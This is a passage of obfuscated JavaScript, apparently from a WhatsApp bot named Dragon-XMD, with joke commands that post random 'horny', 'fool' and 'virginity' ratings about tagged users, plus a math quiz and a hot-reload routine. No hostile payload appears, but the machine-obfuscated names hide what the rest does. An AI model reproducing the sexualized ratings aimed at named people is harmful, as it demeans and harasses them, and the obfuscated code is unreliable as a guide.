            let _0xba283c = '*' + _0x24d1e6 + "'s Horny Level:*\n❤️ " + _0x39c537 + "%\n\n" + _0x5593cf;
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': _0xba283c,
              'mentions': [_0x58b9bf]
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "fooltest":
        case "foolrate":
          {
            let _0x21a4e0 = _0x10d7a1.mentionedJid?.[0x0] || _0x10d7a1.sender;
            let _0x4f3064 = (await _0x34f9ed.getName(_0x21a4e0)) || "This person";
            let _0x2ba441 = Math.floor(Math.random() * 0x65);
            let _0x5a348f = _0x2ba441 < 0x14 ? "🧠 This one's got some sense!" : _0x2ba441 < 0x32 ? "🤪 Lowkey goofy!" : _0x2ba441 < 0x50 ? "🤣 Certified clown!" : "🤡 Ultimate fool unlocked!";
            let _0xf37b51 = '*' + _0x4f3064 + "'s Fool Level:*\n🤡 " + _0x2ba441 + "%\n\n" + _0x5a348f;
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': _0xf37b51,
              'mentions': [_0x21a4e0]
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "virginitytest":
        case "virginityrate":
          {
            let _0x3d6e82 = _0x10d7a1.mentionedJid?.[0x0] || _0x10d7a1.sender;
            let _0x4273d8 = (await _0x34f9ed.getName(_0x3d6e82)) || "This person";
            let _0x57e179 = Math.floor(Math.random() * 0x65);
            let _0x511399 = _0x57e179 === 0x64 ? "👼 Still a pure angel!" : _0x57e179 > 0x4b ? "😇 Mostly innocent!" : _0x57e179 > 0x32 ? "😏 Getting curious, huh?" : _0x57e179 > 0x19 ? "🔥 You've seen things..." : _0x57e179 > 0x0 ? "😈 Oh, you wild!" : "💥 Virginity? What's that? Gone!";
            let _0x159849 = '*' + _0x4273d8 + "'s Virginity Level:*\n🔞 " + _0x57e179 + "%\n\n" + _0x511399;
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': _0x159849,
              'mentions': [_0x3d6e82]
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "checkme":
        case " checkall":
          {
            let _0x12f03a = _0x10d7a1.mentionedJid?.[0x0] || _0x10d7a1.sender;
            let _0x81cc3e = (await _0x34f9ed.getName(_0x12f03a)) || "This person";
            let _0x544583 = Math.floor(Math.random() * 0x65);
            let _0x586582 = Math.floor(Math.random() * 0x65);
            let _0x50920a = Math.floor(Math.random() * 0x65);
            let _0x44aced = Math.floor(Math.random() * 0x65);
            let _0x5b5962 = Math.floor(Math.random() * 0x97);
            let _0x51be89 = Math.floor(Math.random() * 0x65);
            let _0x23d253 = ["Nyama Choma", "Ugali Sukuma", "Chapati Beans", "Pilau", "Githeri", "Mutura", "Matoke", 'Mandazi', "Fish Fry"];
            let _0xf6d72c = ["Sleeping", "Dancing", "Watching series", "Texting their ex", "Eating", "TikToking", "Stalking crush", "Gaming", "Drawing"];
            let _0x213b65 = ["Invisibility", "Mind Reading", "Teleportation", "Talking to Animals", "Unlimited Data", "Vibe Controller", "Horny Neutralizer", "Overthinking Mastery"];
            let _0x2404e5 = _0x23d253[Math.floor(Math.random() * _0x23d253.length)];
            let _0x37282a = _0xf6d72c[Math.floor(Math.random() * _0xf6d72c.length)];
            let _0x917bcd = _0x213b65[Math.floor(Math.random() * _0x213b65.length)];
            let _0x46e6d1 = "*ANALYSIS REPORT FOR:* " + _0x81cc3e + "\n\n*🌟 Beauty:* " + _0x544583 + "%\n*🍲 Favorite Kenyan Food:* " + _0x2404e5 + "\n*🎯 Hobby:* " + _0x37282a + "\n*🔞 Virginity:* " + _0x586582 + "%\n*🤡 Foolrate:* " + _0x50920a + "%\n*🫦 Simp Level:* " + _0x44aced + "%\n*🧠 IQ:* " + _0x5b5962 + "\n*❤️ Loyalty:* " + _0x51be89 + "%\n*⚡ Superpower:* " + _0x917bcd + "\n\n_Analyzed by: Dragon-XMD Bot_";
            let _0x1a288b;
            try {
              _0x1a288b = await _0x34f9ed.profilePictureUrl(_0x12f03a, "image");
            } catch {
              _0x1a288b = 'https://i.imgur.com/5BdYX6b.png';
            }
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'image': {
                'url': _0x1a288b
              },
              'caption': _0x46e6d1,
              'mentions': [_0x12f03a]
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "support":
          {
            _0x10d7a1.reply("*› SUPPORT LIST*\n\n> *DRAGON* (Bot Developer)\n> *NICK* (Bot Base)\n> *CHRISTINE* (My Love)\n\n*FRIENDS*\n> *NIMCO*\n> *MZAZI*\n> *SILVA*\n\n*NOTE:* Thanks to all of you");
          }
          break;
        case "math":
        case 'maths':
          {
            const _0x1f623f = ['+', '-', '*'];
            const _0x29b7f9 = Math.floor(Math.random() * 0x32) + 0x1;
            const _0x3fd5b4 = Math.floor(Math.random() * 0x32) + 0x1;
            const _0x1b6a11 = _0x1f623f[Math.floor(Math.random() * _0x1f623f.length)];
            const _0x54c9f8 = _0x29b7f9 + " " + _0x1b6a11 + " " + _0x3fd5b4;
            const _0x27858c = eval(_0x54c9f8);
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': "🧠 *Math Challenge!*\nSolve this:\n\n*" + _0x54c9f8 + " = ?*\n\n_Reply with the correct answer!_"
            });
            global.mathAnswer = _0x27858c;
            global.mathChat = _0x10d7a1.chat;
          }
          break;
        default:
          {
            if (_0x1c11d6 && _0x586043.toLowerCase() != undefined) {
              if (_0x10d7a1.chat.endsWith("broadcast")) {
                return;
              }
              if (_0x10d7a1.isBaileys) {
                return;
              }
              if (!_0x586043.toLowerCase()) {
                return;
              }
              if (_0x39cfcf || _0x1c11d6 && !_0x10d7a1.isGroup) {
                console.log(chalk.black(chalk.bgRed("[ ERROR ]")), !_0x1cc7(0x641) ? chalk.green(_0x1cc7(0x417)) : chalk.keyword("turquoise")("command"), !_0x1cc7(0x641) ? chalk.green('' + prefix + _0x502a51) : chalk.keyword("turquoise")('' + prefix + _0x502a51), !_0x1cc7(0x641) ? chalk.green(_0x1cc7(0x1f2)) : chalk.keyword("turquoise")("Dragon"));
              } else if (_0x39cfcf || _0x1c11d6 && _0x10d7a1.isGroup) {
                console.log(chalk.black(chalk.bgRed("[ ERROR ]")), chalk.keyword('turquoise')('command'), !_0x1cc7(0x641) ? chalk.green('' + prefix + _0x502a51) : chalk.keyword("turquoise")('' + prefix + _0x502a51), chalk.keyword('turquoise')("Dragon"));
              }
            }
          }
      }
    }
  } catch (_0x151b23) {
    _0x10d7a1.reply(util.format(_0x151b23));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
